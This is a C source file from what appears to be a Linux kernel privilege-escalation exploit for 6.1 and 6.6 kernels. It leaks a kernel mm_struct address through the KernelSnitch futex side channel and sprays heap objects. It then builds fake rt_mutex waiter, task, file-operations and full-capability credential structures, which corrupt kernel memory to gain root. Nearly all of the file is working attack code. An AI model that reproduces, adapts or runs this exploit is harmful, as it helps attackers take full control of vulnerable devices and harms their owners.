#include "common.h"
#include "runtime_struct_offsets.h"
#include "kernelsnitch/kernelsnitch.h"

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

static long long ms_since(struct timespec *t0) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0->tv_sec) * 1000LL +
         (now.tv_nsec - t0->tv_nsec) / 1000000LL;
}

uintptr_t page_base;
uintptr_t last_mm_struct;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;

int pselect_custom_write;
uintptr_t pselect_custom_target;
int pselect_child_node;  /* Preserve initialized bytes when set. */

void set_pselect_write_mode(uintptr_t target, int mode) {
  pselect_custom_target = target;
  pselect_custom_write = mode;
}

void clear_pselect_write(void) {
  pselect_custom_write = 0;
  pselect_custom_target = 0;
}

int tcp_route_selected(void) {
  /* Compact (6.1) defaults to the TCP zerocopy route — the only
   * device-proven 6.1 transport (rmp target.h MAIN_TCP_ROUTE_DEFAULT
   * 1; the pselect route hit the documented rb_leftmost misalignment).
   * GHOSTLOCK_TCP_ROUTE=0 falls back to pselect for comparison runs. */
  const char *s = getenv("GHOSTLOCK_TCP_ROUTE");
  if (s && *s && strcmp(s, "0") == 0) {
    return 0;
  }
  return active_offsets && active_offsets->compact_waiter;
}

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s route=%s\n", getpid(),
             BUILD_VARIANT_LABEL,
             tcp_route_selected() ? "tcp-cfi" : "pselect");
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)p0_kernel_phys_load,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 3;    /* SCHED_BATCH — nice change triggers PI walk (pi=true) */
  attr.sched_nice = nice_value;
  errno = 0;
  long ret = syscall(274, tid, &attr, 0);
  if (ret != 0) {
    pr_error("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
  }
  return ret;
}

/* Bootloader-selected physical load address. */
uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;

/* Selected entry's init_cred image address. */
uintptr_t g_init_cred_image;

void init_p0_profile(void) {
  pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
          (unsigned long long)p0_kernel_phys_load,
          (unsigned long long)(p0_kernel_phys_load - P0_PHYS_OFFSET));
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = p0_kernel_phys_load + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

static void fill_init_cred_copy(unsigned char *p, size_t off) {
  unsigned char *c = p + off;
  memset(c, 0, 136);
  put32(c, 0, 1);
  for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
    uint64_t cap = 0xFFFFFFFFFFFFFFFFULL;
    memcpy(c + CRED_CAPS_OFF + i * 8, &cap, sizeof(cap));
  }
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 8 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

int prepare_skb_payload(uintptr_t base) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  /* TCP payload geometry (rmp src/61/util.c MAIN_TCP_PAYLOAD): delta 0,
   * chunk bias 0xe80, fake_task at 0x5800 — avoids the fake_lock
   * rb_leftmost misalignment seen with the pselect layout on 6.1. */
  int tcp = tcp_route_selected();
  long long payload_delta = tcp ? 0 : SKB_DATA_DELTA;
  size_t chunk_bias = tcp ? 0xe80 : (size_t)SKB_FRAG_BIAS;
  size_t fake_task_off = tcp ? TCP_FAKE_TASK_OFF : (size_t)FAKE_TASK_OFF;
  size_t lock_off = tcp ? (size_t)TCP_LOCK_OFF : (size_t)LOCK_OFF;
  size_t w0_off = tcp ? (size_t)TCP_W0_OFF : (size_t)W0_OFF;

  uintptr_t payload_base = base + payload_delta;

  uintptr_t write_pc;
  uintptr_t write_right;
  uintptr_t write_left;
  uint64_t waiter_task;
  uint64_t task_group;
  uint64_t pi_top_task;
  uint32_t w0_prio;

  if (tcp) {
    /* FOPS payload (rmp): the ONE race-time write relinks
     * misc_fops <- fake_fops through pi_tree_entry
     * {pc=value, right=0, left=target}; every stage after that runs on
     * the cfi primitives in cfi.c. Waiter prio must stay >120 so the
     * stale waiter becomes top waiter and rt_mutex_dequeue_pi erases it. */
    fake_lock = payload_base + TCP_LOCK_OFF;
    fake_w0 = payload_base + TCP_W0_OFF;
    fake_task = payload_base + fake_task_off;
    fake_fops = payload_base + TCP_FAKE_FOPS_OFF;
    g_binwrite_target = payload_base + TCP_SCRATCH_OFF;
    write_pc = fake_fops;
    write_right = 0;
    write_left = data_addr(KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF);
    waiter_task = SLIDE_INIT_TASK;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = SLIDE_INIT_TASK;
    w0_prio = TCP_FAKE_WAITER_PRIO;
  } else {
    fake_lock = payload_base + LOCK_OFF;
    fake_w0 = payload_base + W0_OFF;
    fake_task = payload_base + fake_task_off;
    fake_fops = payload_base + FOPS_TABLE_OFF;
    if (pselect_custom_write) {
      if (pselect_child_node) {
        if (pselect_custom_write == 2) {
          /* W2 uses init_cred; resolve it from the selected device entry. */
          fake_right = data_addr(g_init_cred_image);
        } else {
          /* W1 targets the initialized page at base+0x100. */
          fake_right = base + 0x100;
        }
      } else {
        fake_right = 0;  /* leaf: write 0 */
      }
      fake_left = 0;
      if (pselect_custom_write == 2) {
        fake_fops = payload_base + CRED_COPY_OFF;
      }
      fake_parent = pselect_custom_target - 8;
    }

    write_pc = fake_parent;
    write_right = fake_right;
    write_left = fake_left;
    waiter_task = INIT_TASK;
    task_group = ROOT_TASK_GROUP;
    pi_top_task = INIT_TASK;
    w0_prio = FAKE_WAITER_PRIO;
  }

  int compact = active_offsets && active_offsets->compact_waiter;

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + chunk_bias;

    put32(p, lock_off + 0x00, 0);
    put64(p, lock_off + 0x08, fake_w0);
    put64(p, lock_off + 0x10, fake_w0);
    put64(p, lock_off + 0x18, fake_task | 1);

    if (compact) {
      /* 6.1 COMPACT_RT_MUTEX_WAITER:
       * tree_entry[0x18] pi_tree_entry[0x18] task@0x30 lock@0x38
       * wake_state@0x40 prio@0x44 deadline@0x48 ww_ctx@0x50 */
      put64(p, w0_off + 0x00, 1);           /* tree_entry.rb_parent_color */
      put64(p, w0_off + 0x08, 0);           /* tree_entry.rb_right */
      put64(p, w0_off + 0x10, 0);           /* tree_entry.rb_left */
      put64(p, w0_off + 0x18, write_pc);    /* pi_tree_entry.rb_parent_color */
      put64(p, w0_off + 0x20, write_right); /* pi_tree_entry.rb_right */
      put64(p, w0_off + 0x28, write_left);  /* pi_tree_entry.rb_left */
      put64(p, w0_off + 0x30, waiter_task); /* task */
      put64(p, w0_off + 0x38, fake_lock);   /* lock */
      put32(p, w0_off + 0x40, 0);           /* wake_state */
      put32(p, w0_off + 0x44, w0_prio);     /* prio */
      put64(p, w0_off + 0x48, 0);           /* deadline */
      put64(p, w0_off + 0x50, 0);           /* ww_ctx */

      if (tcp) {
        /* Fake fops table: three real function pointers only — nothing
         * else is ever called on the hijacked fd. llseek seeds the
         * fake_w0 marker and is repaired to noop_llseek right after
         * acquire (cfi_try_acquire). */
        put64(p, TCP_FAKE_FOPS_OFF + FOPS_OWNER_OFF, 0);
        put64(p, TCP_FAKE_FOPS_OFF + FOPS_LLSEEK_OFF, fake_w0 + 0x18);
        put64(p, TCP_FAKE_FOPS_OFF + FOPS_READ_ITER_OFF,
              cfi_plant_text_addr(CONFIGFS_READ_ITER_OFF));
        put64(p, TCP_FAKE_FOPS_OFF + FOPS_WRITE_ITER_OFF,
              cfi_plant_text_addr(CONFIGFS_BIN_WRITE_ITER_OFF));
        put64(p, TCP_FAKE_FOPS_OFF + FOPS_IOCTL_OFF,
              cfi_plant_text_addr(ASHMEM_IOCTL_OFF));
      }
    } else {
      /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
      put64(p, W0_OFF + 0x00, 1);
      put64(p, W0_OFF + 0x08, 0);
      put64(p, W0_OFF + 0x10, 0);
      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
    }

    /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
    uint32_t ft_prio_off       = compact ? active_offsets->task_prio
                                         : FAKE_TASK_PRIO_OFF;
    uint32_t ft_nprio_off      = compact ? active_offsets->task_normal_prio
                                         : FAKE_TASK_NORMAL_PRIO_OFF;
    uint32_t ft_tg_off         = compact ? active_offsets->task_sched_task_group
                                         : FAKE_TASK_TASK_GROUP_OFF;
    uint32_t ft_pi_lock_off    = compact ? active_offsets->task_pi_lock
                                         : FAKE_TASK_PI_LOCK_OFF;
    uint32_t ft_pi_wait_off    = compact ? active_offsets->task_pi_waiters
                                         : FAKE_TASK_PI_WAITERS_OFF;
    uint32_t ft_pi_top_off     = compact ? active_offsets->task_pi_top_task
                                         : FAKE_TASK_PI_TOP_TASK_OFF;
    uint32_t ft_pi_blocked_off = compact ? active_offsets->task_pi_blocked_on
                                         : FAKE_TASK_PI_BLOCKED_ON_OFF;

    put32(p, fake_task_off + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, fake_task_off + ft_prio_off, FAKE_TASK_PRIO);
    put32(p, fake_task_off + ft_nprio_off, FAKE_TASK_PRIO);
    put32(p, fake_task_off + ft_pi_lock_off, 0);
    /* Empty PI waiters avoid tree rebalancing during reinsertion. */
    put64(p, fake_task_off + ft_pi_wait_off, 0);
    put64(p, fake_task_off + ft_pi_wait_off + 0x08, 0);
    put64(p, fake_task_off + ft_tg_off, task_group);
    put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
    put64(p, fake_task_off + ft_pi_blocked_off, 0);

    /* Tree-node scratch words and the init_cred copy are pselect-overlay
     * only; the tcp payload carries its whole write in the waiter. */
    if (!tcp) {
      put64(p, RIGHT_OFF + 0x00, fake_parent);
      put64(p, RIGHT_OFF + 0x08, 0);
      put64(p, RIGHT_OFF + 0x10, 0);

      put64(p, LEFT_OFF + 0x00, fake_parent);
      put64(p, LEFT_OFF + 0x08, 0);
      put64(p, LEFT_OFF + 0x10, 0);

      if (pselect_custom_write >= 2) {
        fill_init_cred_copy(p, CRED_COPY_OFF);
      }
    }
  }
  return 1;
}

uintptr_t prepare_kernel_page(void) {
  struct timespec t_spray;
  clock_gettime(CLOCK_MONOTONIC, &t_spray);
  close_reclaim_sockets();
  mm_objs_per_slab = ORDER3_SIZE / mm_struct_sz();
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
  pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
          cpu_count, ms_since(&t_spray));

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  pr_info("[spray] finding futex collisions... +%lldms\n",
          ms_since(&t_spray));
  {
    struct timespec t_wait;
    clock_gettime(CLOCK_MONOTONIC, &t_wait);
    int leak_status = 0;
    pid_t wp = 0;
    long long last_beat = 0;
    for (;;) {
      wp = waitpid(child_leak, &leak_status, WNOHANG);
      if (wp == child_leak) {
        break;
      }
      if (wp < 0) {
        pr_warning("waitpid leak child: %m\n");
        break;
      }
      long long waited = ms_since(&t_wait);
      if (waited >= 60000) {
        pr_warning("leak child stuck >60s, killing it\n");
        kill(child_leak, SIGKILL);
        waitpid(child_leak, NULL, 0);
        break;
      }
      if (waited - last_beat >= 2000) {
        size_t scan_done = ks->scan_done;
        size_t scan_total = ks->total_futexes;
        if (scan_done > scan_total) scan_done = scan_total;
        size_t scan_id = (scan_done * 4096) | ((scan_done * 8) % 4096);
        if (scan_id > (size_t)FUTEX_SZ) scan_id = (size_t)FUTEX_SZ;
        pr_info("[spray]   still finding collisions (%llds) %zu%% "
                "(futex 0x%zx/0x%zx)...\n",
                waited / 1000,
                scan_total ? scan_done * 100 / scan_total : 0,
                scan_id, (size_t)FUTEX_SZ);
        last_beat = waited;
      }
      usleep(50000);
    }
    if (wp == child_leak &&
        (!WIFEXITED(leak_status) || WEXITSTATUS(leak_status) != 0)) {
      pr_warning("leak child exit status=%d\n", leak_status);
    }
  }
  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("[spray] futex collisions not found\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  pr_info("[spray] futex collisions found +%lldms\n",
          ms_since(&t_spray));
  kernelsnitch_bruteforce(ks);
  pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
          (size_t)ks->mm_struct, ms_since(&t_spray));
  uintptr_t leaked = ks->mm_struct;
  last_mm_struct = leaked;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  if (!prepare_skb_payload(base)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
      break;
    }
  }
  pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    SYSCHK(close(prepare_ctx.memfds[i]));
    prepare_ctx.memfds[i] = -1;
    kill_child(prepare_ctx.childs[i]);
  }

  return base;
}

uintptr_t prepare_good_kernel_page(void) {
  int max_attempts = 4;
  struct timespec t_good;
  clock_gettime(CLOCK_MONOTONIC, &t_good);
  struct timespec deadline = t_good;
  deadline.tv_sec += 240;
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page();
    if (base) {
      pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
              ms_since(&t_good));
      return base;
    }
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    if (now.tv_sec >= deadline.tv_sec) {
      pr_warning("prepare_kernel_page timeout after %d attempts\n", attempt);
      break;
    }
    pr_warning("prepare_kernel_page retry %d/%d +%lldms\n", attempt,
               max_attempts, ms_since(&t_good));
  }
  return 0;
}
